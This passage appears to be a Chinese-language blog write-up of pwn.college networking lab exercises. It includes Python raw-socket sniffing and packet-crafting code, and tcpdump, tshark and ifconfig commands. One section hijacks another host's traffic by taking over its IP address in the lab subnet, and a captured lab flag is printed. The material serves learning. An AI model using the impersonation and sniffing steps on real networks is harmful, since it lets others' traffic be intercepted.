class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_ip_header</span>(<span class="params">data</span>):</span><br><span class="line">    ip_header = struct.unpack(<span class="string">&#x27;!BBHHHBBH4s4s&#x27;</span>, data[:<span class="number">20</span>])</span><br><span class="line">    version_ihl = ip_header[<span class="number">0</span>]</span><br><span class="line">    version = version_ihl &gt;&gt; <span class="number">4</span></span><br><span class="line">    ihl = version_ihl &amp; <span class="number">0xF</span></span><br><span class="line">    tos = ip_header[<span class="number">1</span>]</span><br><span class="line">    total_length = ip_header[<span class="number">2</span>]</span><br><span class="line">    identification = ip_header[<span class="number">3</span>]</span><br><span class="line">    flags_offset = ip_header[<span class="number">4</span>]</span><br><span class="line">    ttl = ip_header[<span class="number">5</span>]</span><br><span class="line">    protocol = ip_header[<span class="number">6</span>]</span><br><span class="line">    checksum = ip_header[<span class="number">7</span>]</span><br><span class="line">    src_ip = socket.inet_ntoa(ip_header[<span class="number">8</span>])</span><br><span class="line">    dst_ip = socket.inet_ntoa(ip_header[<span class="number">9</span>])</span><br><span class="line"></span><br><span class="line">    ip_header_info = &#123;</span><br><span class="line">        <span class="string">&#x27;Version&#x27;</span>: version,</span><br><span class="line">        <span class="string">&#x27;Header Length&#x27;</span>: ihl * <span class="number">4</span>,</span><br><span class="line">        <span class="string">&#x27;Type of Service&#x27;</span>: tos,</span><br><span class="line">        <span class="string">&#x27;Total Length&#x27;</span>: total_length,</span><br><span class="line">        <span class="string">&#x27;Identification&#x27;</span>: identification,</span><br><span class="line">        <span class="string">&#x27;Flags and Fragment Offset&#x27;</span>: flags_offset,</span><br><span class="line">        <span class="string">&#x27;TTL&#x27;</span>: ttl,</span><br><span class="line">        <span class="string">&#x27;Protocol&#x27;</span>: protocol,</span><br><span class="line">        <span class="string">&#x27;Header Checksum&#x27;</span>: checksum,</span><br><span class="line">        <span class="string">&#x27;Source IP&#x27;</span>: src_ip,</span><br><span class="line">        <span class="string">&#x27;Destination IP&#x27;</span>: dst_ip</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ip_header_info</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_tcp_header</span>(<span class="params">data</span>):</span><br><span class="line">    tcp_header = struct.unpack(<span class="string">&#x27;!HHLLBBHHH&#x27;</span>, data[:<span class="number">20</span>])</span><br><span class="line">    src_port = tcp_header[<span class="number">0</span>]</span><br><span class="line">    dst_port = tcp_header[<span class="number">1</span>]</span><br><span class="line">    sequence = tcp_header[<span class="number">2</span>]</span><br><span class="line">    acknowledgment = tcp_header[<span class="number">3</span>]</span><br><span class="line">    offset_reserved_flags = tcp_header[<span class="number">4</span>]</span><br><span class="line">    data_offset = (offset_reserved_flags &gt;&gt; <span class="number">4</span>) * <span class="number">4</span></span><br><span class="line">    flags = tcp_header[<span class="number">5</span>]</span><br><span class="line">    window = tcp_header[<span class="number">6</span>]</span><br><span class="line">    checksum = tcp_header[<span class="number">7</span>]</span><br><span class="line">    urgent_pointer = tcp_header[<span class="number">8</span>]</span><br><span class="line"></span><br><span class="line">    tcp_header_info = &#123;</span><br><span class="line">        <span class="string">&#x27;Source Port&#x27;</span>: src_port,</span><br><span class="line">        <span class="string">&#x27;Destination Port&#x27;</span>: dst_port,</span><br><span class="line">        <span class="string">&#x27;Sequence Number&#x27;</span>: sequence,</span><br><span class="line">        <span class="string">&#x27;Acknowledgment Number&#x27;</span>: acknowledgment,</span><br><span class="line">        <span class="string">&#x27;Data Offset&#x27;</span>: data_offset,</span><br><span class="line">        <span class="string">&#x27;Flags&#x27;</span>: flags,</span><br><span class="line">        <span class="string">&#x27;Window Size&#x27;</span>: window,</span><br><span class="line">        <span class="string">&#x27;Checksum&#x27;</span>: checksum,</span><br><span class="line">        <span class="string">&#x27;Urgent Pointer&#x27;</span>: urgent_pointer</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> tcp_header_info</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start_sniffer</span>(<span class="params">port</span>):</span><br><span class="line">    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)</span><br><span class="line">    sock.bind((<span class="string">&quot;0.0.0.0&quot;</span>, port))</span><br><span class="line">    sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Listening on port <span class="subst">&#123;port&#125;</span>...&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            packet, addr = sock.recvfrom(<span class="number">65565</span>)</span><br><span class="line">            ip_header = parse_ip_header(packet[:<span class="number">20</span>])</span><br><span class="line">            tcp_header = parse_tcp_header(packet[<span class="number">20</span>:<span class="number">40</span>])</span><br><span class="line"></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;IP Header:&quot;</span>, ip_header)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;TCP Header:&quot;</span>, tcp_header)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Payload:&quot;</span>, packet[<span class="number">40</span>:])</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Sniffer stopped.&quot;</span>)</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        sock.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    port = <span class="number">31337</span></span><br><span class="line">    start_sniffer(port)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="2-6-Monitor-slow-traffic-from-a-remote-host"><a href="#2-6-Monitor-slow-traffic-from-a-remote-host" class="headerlink" title="2.6 Monitor slow traffic from a remote host"></a>2.6 Monitor slow traffic from a remote host</h3><p>首先使用<code>tshark -i eth0 -f &quot;tcp port 31337&quot; -w tcp_capture.pcap</code>抓取TCP数据包</p>
<p>然后使用wireshark 打开.pcap文件</p>
<p>右键点击数据包并点击Follow-&gt;TCP Stream 查看完整的TCP Stream内容</p>
<h3 id="2-7-Hijack-traffic-from-a-remote-host-by-configuring-your-network-interface"><a href="#2-7-Hijack-traffic-from-a-remote-host-by-configuring-your-network-interface" class="headerlink" title="2.7 Hijack traffic from a remote host by configuring your network interface"></a>2.7 Hijack traffic from a remote host by configuring your network interface</h3><p>10.0.0.4试图与10.0.0.2建立连接，我们要在子网中的10.0.0.3中建立与10.0.0.4的连接并拦截数据包。</p>
<p>首先使用命令</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -i eth0 -nn -vv arp and host 10.0.0.4</span><br></pre></td></tr></table></figure>

<blockquote>
<ul>
<li>**<code>tcpdump</code>**：这是一个网络抓包工具，用于捕获和分析通过网络接口传输的数据包。</li>
<li>**<code>-i eth0</code>**：指定监听的网络接口，这里是 <code>eth0</code>。<code>tcpdump</code> 将在这个接口上捕获数据包。</li>
<li>**<code>-nn</code>**：禁用主机名和端口名的解析，将直接显示IP地址和端口号，而不是尝试将它们解析为主机名和服务名称。<code>-n</code> 选项是指不进行主机名解析，第二个 <code>-n</code> 则是指不进行端口名解析。</li>
<li>**<code>-vv</code>**：增加输出的详细程度，显示更详细的信息。<code>-v</code> 表示详细输出，<code>-vv</code> 则表示更详细的输出。</li>
<li>**<code>arp</code>**：指定只捕获 ARP（地址解析协议）数据包。</li>
<li>**<code>and host 10.0.0.4</code>**：进一步过滤数据包，只捕获与 IP 地址 <code>10.0.0.4</code> 相关的 ARP 数据包。</li>
</ul>
</blockquote>
<p>得到输出<code>07:11:37.169764 ARP, Ethernet (len 6), IPv4 (len 4), Request who-has 10.0.0.2 tell 10.0.0.4, length 28</code></p>
<p>我们知道<code>10.0.0.4</code>正在子网中通过ARP协议寻找<code>10.0.0.2</code>的MAC地址。</p>
<p>如何设置当前主机的IP地址为<code>10.0.0.3</code>呢?</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig eth0 down</span><br></pre></td></tr></table></figure>

<p>这条命令将网络接口 <code>eth0</code> 关闭，使其停止工作。这意味着在此接口上将不再发送或接收任何数据包。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig eth0 10.0.0.2 netmask 255.255.255.0</span><br></pre></td></tr></table></figure>

<p>这条命令为 <code>eth0</code> 接口分配了一个新的 IP 地址和子网掩码。</p>
<p>**<code>10.0.0.2</code>**：这是分配给 <code>eth0</code> 接口的新的 IP 地址。</p>
<p>**<code>netmask 255.255.255.0</code>**：这是为 <code>eth0</code> 接口设置的子网掩码，表示该网络的子网范围（即 <code>10.0.0.x</code> 网络范围，子网掩码 255.255.255.0 表示该子网可以容纳 256 个 IP 地址，从 10.0.0.0 到 10.0.0.255）。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig eth0 up</span><br></pre></td></tr></table></figure>

<p>重启 eth0接口，现在 <code>eth0</code> 将使用新分配的 IP 地址 <code>10.0.0.2</code> 和子网掩码 <code>255.255.255.0</code> 进行网络通信。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@ip-10-0-0-3:~<span class="comment"># tcpdump -i eth0 -nn -vv arp and host 10.0.0.4</span></span><br><span class="line">tcpdump: listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes</span><br><span class="line">07:32:39.844656 ARP, Ethernet (len 6), IPv4 (len 4), Request who-has 10.0.0.2 tell 10.0.0.4, length 28</span><br><span class="line">07:32:39.844683 ARP, Ethernet (len 6), IPv4 (len 4), Reply 10.0.0.2 is-at fe:b6:ce:6b:ab:98, length 28</span><br></pre></td></tr></table></figure>

<p>可以看出已经建立了连接。</p>
<p>接着查看端口31337中的数据包</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 31337</span><br><span class="line">pwn.college&#123;E7AsHod1vWLoBCbJmzDx9s42l3A.dVjNzMDL5cjM1UzW&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>**<code>-l</code>**：表示 Netcat 以服务器模式启动，监听指定端口。</li>
<li>**<code>-v</code>**：启用详细输出模式，显示更多的连接信息。</li>
<li>**<code>-p 31337</code>**：指定 Netcat 监听的端口号为 <code>31337</code>。</li>
</ul>
<h3 id="2-8-Manually-send-an-Ethernet-packet"><a href="#2-8-Manually-send-an-Ethernet-packet" class="headerlink" title="2.8 Manually send an Ethernet packet"></a>2.8 Manually send an Ethernet packet</h3><p>任务是向10.0.0.3的主机发送以太网帧，能否连接网络不重要，不能使用scapy构建以太网帧，10.0.0.3的mac地址在ppt中找到，本机的mac地址使用ifconfig命令获取。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="comment"># 对方的MAC地址</span></span><br><span class="line">dst_mac = <span class="string">b&#x27;\xaa\xbb\xcc\xdd\xee\xff&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 您的MAC地址</span></span><br><span class="line">src_mac = <span class="string">b&#x27;\xa2\xd4\x52\x19\x77\xcc&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># EtherType</span></span><br><span class="line">ethertype = <span class="string">b&#x27;\xff\xff&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 数据负载 (可选)</span></span><br><span class="line">payload = <span class="string">b&#x27;Hello, Ethernet!&#x27;</span>  <span class="comment"># 这里可以是任意数据</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造以太网帧</span></span><br><span class="line">frame = dst_mac + src_mac + ethertype + payload</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建原始套接字</span></span><br><span class="line">sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)</span><br><span class="line">sock.bind((<span class="string">&quot;eth0&quot;</span>, <span class="number">0</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送以太网帧</span></span><br><span class="line">sock.send(frame)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Ethernet frame sent!&quot;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="2-9-Manually-send-an-Internet-Protocol-packet"><a href="#2-9-Manually-send-an-Internet-Protocol-packet" class="headerlink" title="2.9 Manually send an Internet Protocol packet"></a>2.9 Manually send an Internet Protocol packet</h3><p>这里的问题是，默认情况下，<code>sock.sendto(packet, (dst_ip, 0))</code> 发送的 IP 数据包会通过系统的路由表决定从哪个网络接口发送，但当前环境是无妨访问网络的，主机默认使用eth0网络接口与外界通信，所以组装好的IP数据包要发送到eth0网络接口上：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算IP头部校验和</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">checksum</span>(<span class="params">data</span>):</span><br><span class="line">    s = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(data), <span class="number">2</span>):</span><br><span class="line">        w = (data[i] &lt;&lt; <span class="number">8</span>) + (data[i + <span class="number">1</span>])</span><br><span class="line">        s = s + w</span><br><span class="line">    s = (s &gt;&gt; <span class="number">16</span>) + (s &amp; <span class="number">0xffff</span>)</span><br><span class="line">    s = ~s &amp; <span class="number">0xffff</span></span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造IP头部</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">construct_ip_header</span>(<span class="params">src_ip, dst_ip, proto</span>):</span><br><span class="line">    ip_ver = <span class="number">4</span></span><br><span class="line">    ip_ihl = <span class="number">5</span></span><br><span class="line">    ip_ver_ihl = (ip_ver &lt;&lt; <span class="number">4</span>) + ip_ihl</span><br><span class="line">    ip_dscp_ecn = <span class="number">0</span></span><br><span class="line">    ip_tot_len = <span class="number">20</span> + <span class="number">8</span></span><br><span class="line">    ip_id = <span class="number">54321</span></span><br><span class="line">    ip_frag_off = <span class="number">0</span></span><br><span class="line">    ip_ttl = <span class="number">64</span></span><br><span class="line">    ip_proto = proto</span><br><span class="line">    ip_check = <span class="number">0</span></span><br><span class="line">    ip_src = socket.inet_aton(src_ip)</span><br><span class="line">    ip_dst = socket.inet_aton(dst_ip)</span><br><span class="line"></span><br><span class="line">    ip_header = struct.pack(<span class="string">&#x27;!BBHHHBBH4s4s&#x27;</span>,</span><br><span class="line">                            ip_ver_ihl, ip_dscp_ecn, ip_tot_len, ip_id, ip_frag_off,</span><br><span class="line">                            ip_ttl, ip_proto, ip_check, ip_src, ip_dst)</span><br><span class="line">    ip_check = checksum(ip_header)</span><br><span class="line">    ip_header = struct.pack(<span class="string">&#x27;!BBHHHBBH4s4s&#x27;</span>,</span><br><span class="line">                            ip_ver_ihl, ip_dscp_ecn, ip_tot_len, ip_id, ip_frag_off,</span><br><span class="line">                            ip_ttl, ip_proto, ip_check, ip_src, ip_dst)</span><br><span class="line">    <span class="keyword">return</span> ip_header</span><br><span class="line"></span><br><span class="line"><span class="comment"># 本地主机的IP地址</span></span><br><span class="line">src_ip = <span class="string">&quot;10.0.0.2&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 目标主机的IP地址</span></span><br><span class="line">dst_ip = <span class="string">&quot;10.0.0.3&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># IP协议字段设置为0xFF</span></span><br><span class="line">proto = <span class="number">0xFF</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造IP头部</span></span><br><span class="line">ip_header = construct_ip_header(src_ip, dst_ip, proto)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 数据负载 (可选)</span></span><br><span class="line">payload = <span class="string">b&quot;Hello, IP Protocol 0xFF&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 最终数据包</span></span><br><span class="line">packet = ip_header + payload</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建原始套接字</span></span><br><span class="line">sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 绑定到eth0接口</span></span><br><span class="line">sock.setsockopt(socket.SOL_SOCKET, <span class="number">25</span>, <span class="string">b&#x27;eth0&#x27;</span> + <span class="string">b&#x27;\0&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送IP数据包</span></span><br><span class="line">sock.sendto(packet, (dst_ip, <span class="number">0</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;IP packet sent to 10.0.0.3 with IP protocol 0xFF&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="2-10-Manually-send-a-Transmission-Control-Protocol-packet"><a href="#2-10-Manually-send-a-Transmission-Control-Protocol-packet" class="headerlink" title="2.10 Manually send a Transmission Control Protocol packet"></a>2.10 Manually send a Transmission Control Protocol packet</h3><p>使用python构建一个TCP 包，然后将socket绑定到eth0上发送</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">checksum</span>(<span class="params">msg</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    计算TCP头部的校验和。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    s = <span class="number">0</span></span><br><span class="line">    <span class="comment"># 每次处理两个字节</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(msg), <span class="number">2</span>):</span><br><span class="line">        w = (msg[i] &lt;&lt; <span class="number">8</span>) + (msg[i + <span class="number">1</span>])</span><br><span class="line">        s = s + w</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 处理进位</span></span><br><span class="line">    s = (s &gt;&gt; <span class="number">16</span>) + (s &amp; <span class="number">0xffff</span>)</span><br><span class="line">    s = s + (s &gt;&gt; <span class="number">16</span>)</span><br><span class="line">    <span class="comment"># 取反并只保留低16位</span></span><br><span class="line">    s = ~s &amp; <span class="number">0xffff</span></span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_tcp_packet</span>(<span class="params">source_ip, dest_ip, source_port, dest_port, seq, ack_seq, flags, user_data=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    创建一个TCP包。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    doff = <span class="number">5</span>  <span class="comment"># 数据偏移量，表示头部长度（5 * 4 = 20字节）</span></span><br><span class="line">    window = socket.htons(<span class="number">5840</span>)  <span class="comment"># 窗口大小，最大允许窗口大小</span></span><br><span class="line">    urg_ptr = <span class="number">0</span>  <span class="comment"># 紧急指针（通常为0）</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 解析TCP标志位</span></span><br><span class="line">    urg = (flags &amp; <span class="number">0x20</span>) &gt;&gt; <span class="number">5</span></span><br><span class="line">    ack = (flags &amp; <span class="number">0x10</span>) &gt;&gt; <span class="number">4</span></span><br><span class="line">    psh = (flags &amp; <span class="number">0x08</span>) &gt;&gt; <span class="number">3</span></span><br><span class="line">    rst = (flags &amp; <span class="number">0x04</span>) &gt;&gt; <span class="number">2</span></span><br><span class="line">    syn = (flags &amp; <span class="number">0x02</span>) &gt;&gt; <span class="number">1</span></span><br><span class="line">    fin = flags &amp; <span class="number">0x01</span></span><br><span class="line"></span><br><span class="line">    offset_res = (doff &lt;&lt; <span class="number">4</span>) + <span class="number">0</span>  <span class="comment"># 数据偏移量和保留位</span></span><br><span class="line">    tcp_flags = fin + (syn &lt;&lt; <span class="number">1</span>) + (rst &lt;&lt; <span class="number">2</span>) + (psh &lt;&lt; <span class="number">3</span>) + (ack &lt;&lt; <span class="number">4</span>) + (urg &lt;&lt; <span class="number">5</span>)  <span class="comment"># 组合TCP标志位</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 创建TCP头部</span></span><br><span class="line">    tcp_header = struct.pack(<span class="string">&#x27;!HHLLBBHHH&#x27;</span>, source_port, dest_port, seq, ack_seq, offset_res, tcp_flags, window, <span class="number">0</span>, urg_ptr)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 构造伪头部，用于校验和计算</span></span><br><span class="line">    source_ip = socket.inet_aton(source_ip)  <span class="comment"># 源IP地址</span></span><br><span class="line">    dest_ip = socket.inet_aton(dest_ip)      <span class="comment"># 目标IP地址</span></span><br><span class="line">    placeholder = <span class="number">0</span>  <span class="comment"># 占位符</span></span><br><span class="line">    protocol = socket.IPPROTO_TCP  <span class="comment"># 协议类型（TCP）</span></span><br><span class="line">    tcp_length = <span class="built_in">len</span>(tcp_header) + <span class="built_in">len</span>(user_data)  <span class="comment"># TCP包长度</span></span><br><span class="line"></span><br><span class="line">    pseudo_header = struct.pack(<span class="string">&#x27;!4s4sBBH&#x27;</span>, source_ip, dest_ip, placeholder, protocol, tcp_length)</span><br><span class="line">    pseudo_header = pseudo_header + tcp_header + user_data.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 计算TCP校验和</span></span><br><span class="line">    tcp_checksum = checksum(pseudo_header)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 重新打包TCP头部，包含校验和</span></span><br><span class="line">    tcp_header = struct.pack(<span class="string">&#x27;!HHLLBBH&#x27;</span>, source_port, dest_port, seq, ack_seq, offset_res, tcp_flags, window) + struct.pack(<span class="string">&#x27;H&#x27;</span>, tcp_checksum) + struct.pack(<span class="string">&#x27;!H&#x27;</span>, urg_ptr)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> tcp_header + user_data.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建原始套接字</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)</span><br><span class="line"><span class="keyword">except</span> socket.error <span class="keyword">as</span> msg:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;无法创建套接字。错误代码 : <span class="subst">&#123;msg[<span class="number">0</span>]&#125;</span> 错误信息: <span class="subst">&#123;msg[<span class="number">1</span>]&#125;</span>&#x27;</span>)</span><br><span class="line">    exit()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 绑定到eth0接口</span></span><br><span class="line">s.setsockopt(socket.SOL_SOCKET, socket.SO_BINDTODEVICE, <span class="string">b&#x27;eth0\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">source_ip = <span class="string">&#x27;10.0.0.2&#x27;</span>  <span class="comment"># 源IP地址（根据需要修改）</span></span><br><span class="line">dest_ip = <span class="string">&#x27;10.0.0.3&#x27;</span>    <span class="comment"># 目标IP地址</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># TCP包的字段</span></span><br><span class="line">source_port = <span class="number">31337</span></span><br><span class="line">dest_port = <span class="number">31337</span></span><br><span class="line">seq = <span class="number">31337</span></span><br><span class="line">ack_seq = <span class="number">31337</span></span><br><span class="line">flags = <span class="number">0x1F</span>  <span class="comment"># 标志位对应APRSF (ACK=0x10, PSH=0x08, RST=0x04, SYN=0x02, FIN=0x01)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造TCP包</span></span><br><span class="line">tcp_packet = create_tcp_packet(source_ip, dest_ip, source_port, dest_port, seq, ack_seq, flags)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送数据包</span></span><br><span class="line">s.sendto(tcp_packet, (dest_ip, dest_port))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;数据包已通过eth0发送到 <span class="subst">&#123;dest_ip&#125;</span>:<span class="subst">&#123;dest_port&#125;</span>，标志位为APRSF。&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="2-11-Manually-perform-a-Transmission-Control-Protocol-handshake"><a href="#2-11-Manually-perform-a-Transmission-Control-Protocol-handshake" class="headerlink" title="2.11 Manually perform a Transmission Control Protocol handshake"></a>2.11 Manually perform a Transmission Control Protocol handshake</h3><p>这里要完成一个TCP的handshake操作，当我们运行下面的代码后会发现输出：</p>
<blockquote>
<p>root@ip-10-0-0-2:~# python BaWS&#x2F;I2C&#x2F;2_11.py<br>Sending SYN packet: IP &#x2F; TCP 10.0.0.2:31337 &gt; 10.0.0.3:31337 S<br>WARNING: No route found (no default route?)<br>Begin emission:<br>WARNING: No route found (no default route?)<br>WARNING: more No route found (no default route?)</p>
</blockquote>
